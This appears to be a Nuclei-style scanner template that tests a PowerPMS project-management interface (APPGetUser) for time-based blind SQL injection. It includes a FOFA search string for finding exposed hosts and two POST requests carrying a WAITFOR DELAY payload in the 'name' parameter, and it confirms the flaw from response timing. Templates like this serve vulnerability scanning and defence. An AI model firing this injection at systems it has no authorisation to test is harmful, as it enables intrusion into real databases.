id: poc-yaml-powerpms-powerpms-appgetuser-sqli
info:
  name: 上海普华科技发展股份有限公司PowerPMS接口APPGetUser SQL注入
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: PowerPMS
    fofa: app="普华科技-PowerPMS"

variables:
  t1: '{{rand_int(5,9)}}'
  t2: '{{to_number(t1) + 2}}'
  t3: '{{rand_int(1,4)}}'
  t4: '{{to_number(t3) + 2}}'

http:
  - raw:
      - |
        POST /APPAccount/APPGetUser?name=0%27%29%3BWAITFOR+DELAY+%270%3A0%3A{{t1}}%27--+ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - duration >= to_number(t1)
          - duration <= to_number(t2)
          - contains(body, "未找到数据")

  - raw:
      - |
        POST /APPAccount/APPGetUser?name=0%27%29%3BWAITFOR+DELAY+%270%3A0%3A{{t3}}%27--+ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - duration >= to_number(t3)
          - duration <= to_number(t4)
          - contains(body, "未找到数据")
